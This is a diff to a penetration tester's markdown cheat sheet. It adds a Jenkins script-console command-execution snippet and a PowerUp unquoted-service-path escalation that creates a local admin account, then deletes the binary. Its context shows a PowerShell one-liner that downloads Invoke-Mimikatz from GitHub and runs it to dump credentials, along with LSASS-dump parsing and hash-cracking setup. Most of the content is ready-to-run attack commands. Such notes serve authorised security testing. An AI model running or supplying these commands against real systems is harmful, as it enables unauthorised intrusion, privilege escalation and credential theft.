@@ -135,7 +135,14 @@ Includes web services (not just port 80)
   - Typically runs build scripts etc as SYSTEM
   - Auth can bind to AD or be local. Check `/asynchPeople/` for a list of users anonymously.
   - To run commands:
-    -  
+    - If you're an admin users, you can access the script console directly at `/script/`
+      ```
+      def sout = new StringBuffer(), serr = new StringBuffer()
+      def proc = '[INSERT COMMAND]'.execute()
+      proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000)
+      println "out> $sout err> $serr"
+      ```
+    - For non-admins, but those who can create/add/edit builds, you can run a build cmd. Edit the build, add a build step, "Execute Windows batch cmd", and then `powershell.exe -c` away!
 - Check for Splunk
 
 
@@ -157,7 +164,7 @@ Includes web services (not just port 80)
 ## Linux
 
 ## Windows
-- [ ] Can you RDP in and dump LSASS for to extract with MMK locally? If it's a really poorly-protected/monitored enviro can you invoke mimikatz?
+- Dump LSASS for to extract with MMK locally. If it's a really poorly-protected/monitored enviro you might be able to just run mimikatz
   ```
   # Invoke Mimikatz. Careful, likely won't work with AMSI etc.
   powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
@@ -169,39 +176,50 @@ Includes web services (not just port 80)
   sekurlsa::minidump C:\Users\admin\Documents\lsass.dmp
   sekurlsa::logonpasswords
   ```
+- Poor service permissions & unquoted service paths. `PowerUp.ps1` can identify & exploit this:
+  ```
+  . .\PowerUp.ps1
+  Invoke-Allchecks   # Finds unquoted => C:\Webserver\abyss web server\bla.exe
+  Write-ServiceBinary -Name 'NameOfService' -Path 'C:\Webserver\abyss.exe'  # defaults adds user john & puts in local admin OR
+  Write-ServiceBinary -name 'AbyssWebServer' -Path 'C:\Webserver\abyss.exe' -UserName psc-jm -Password PSCpwn3d
+  Restart-Service AbyssWebServer
+  net users psc-jm
+  del C:\Webserver\abyss.exe  # house cleaning
+  ```
 
 ## Password Cracking
-## Local Cracking
- - [ ] Clone [SecLists](https://github.com/danielmiessler/SecLists.git): `cd /opt/ && git clone https://github.com/danielmiessler/SecLists.git`
- - [ ] Use JtR on your first go locally for quick wins. Kill it if it's mega hecka slow.
-   ```
-   john --list=formats    # lists formats for hashes
-   john hashes.txt --format=nt --rules=all
-   john hashes.txt --format=nt --wordlist=/usr/share/wordlists/rockyou.txt
-   john hashes.txt --format=nt --wordlist=/usr/share/wordlists/rockyou.txt --rules
-   ```
+- [ ] Clone [SecLists](https://github.com/danielmiessler/SecLists.git): `cd /opt/ && git clone https://github.com/danielmiessler/SecLists.git`
+- [ ] Use JtR on your first go locally for quick wins. Kill it if it's mega hecka slow.
+  ```
+  john --list=formats    # lists formats for hashes
+  john hashes.txt --format=nt --rules=all
+  john hashes.txt --format=nt --wordlist=/usr/share/wordlists/rockyou.txt
+  john hashes.txt --format=nt --wordlist=/usr/share/wordlists/rockyou.txt --rules
+  ```
 - CREATE THE KRAKEN!
- - Spin up a `p3.16xlarge` in AWS to get some sweet GPU power
- - SSH in and set up your environment:
-   ```
-   sudo apt update && sudo apt -y upgrade && sudo apt -y dist-upgrade
-   sudo apt install -y ubuntu-drivers-common
-   sudo ubuntu-drivers autoinstall
-   sudo apt install -y opencl-headers ocl-icd-libopencl1 clinfo hashcat
-   sudo shutdown -r now
-   ```
- - Get [Praetorian rules](): `wget praetorian-rules -O /opt/rules.txt`
- - Get bigbutt wordlist: `wget bigbutt-wordlist-O /opt/words.lst`
+  - Spin up a `p3.16xlarge` in AWS to get some sweet GPU power
+  - SSH in and set up your environment:
+  ```
+  sudo apt update && sudo apt -y upgrade && sudo apt -y dist-upgrade
+  sudo apt install -y ubuntu-drivers-common
+  sudo ubuntu-drivers autoinstall
+  sudo apt install -y opencl-headers ocl-icd-libopencl1 clinfo hashcat
+  sudo shutdown -r now
+  ```
+- Get [Praetorian rules](): `wget praetorian-rules -O /opt/rules.txt`
+- Get bigbutt wordlist: `wget bigbutt-wordlist-O /opt/words.lst`
 - RELEASE THE KRAKEN!
- - Straight wordlist attack: `hashcat ` ADD MOAR
- - Add rules:
- - Quick cheatsheet for hash modes:
-   ```
-   500    MD5
-   1000   NT hash (from SAM dump/NTDS)
-   5600   Net-NTLMv2 (from Responder, ntlmrelayx.py)
-   13100  Kerberoast hashes (KRB5TGS 23)
-   ```
+  - Straight wordlist attack: `hashcat ` ADD MOAR
+  - Add rules:
+  - Quick cheatsheet for hash modes:
+    ```
+    500    MD5
+    1000   NT hash (from SAM dump/NTDS)
+    5600   Net-NTLMv2 (from Responder, ntlmrelayx.py)
+    13100  Kerberoast hashes (KRB5TGS 23)
+    ```
+    
+    
 ## OSINT
 - Harvest emails:
   - `theHarvester`: 
